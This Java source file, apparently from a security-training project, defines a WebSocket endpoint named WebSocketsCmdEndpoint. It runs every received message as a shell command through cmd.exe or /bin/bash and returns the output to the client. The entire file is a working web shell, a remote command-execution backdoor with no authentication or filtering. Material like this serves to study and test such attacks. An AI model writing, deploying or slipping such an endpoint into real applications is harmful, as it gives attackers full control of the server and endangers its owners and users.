package org.joychou.config;

import javax.websocket.*;
import java.io.InputStream;

public class WebSocketsCmdEndpoint extends Endpoint implements MessageHandler.Whole<String> {
    private Session session;

    @Override
    public void onOpen(Session session, EndpointConfig endpointConfig) {
        this.session = session;
        session.addMessageHandler(this);
    }

    @Override
    public void onClose(Session session, CloseReason closeReason) {
        super.onClose(session, closeReason);
    }

    @Override
    public void onError(Session session, Throwable throwable) {
        super.onError(session, throwable);
    }

    @Override
    public void onMessage(String s) {
        try {
            Process process;
            boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
            if (bool) {
                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", s});
            } else {
                process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", s});
            }
            InputStream inputStream = process.getInputStream();
            StringBuilder stringBuilder = new StringBuilder();
            int i;
            while ((i = inputStream.read()) != -1) stringBuilder.append((char) i);
            inputStream.close();
            process.waitFor();
            session.getBasicRemote().sendText(stringBuilder.toString());
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }
}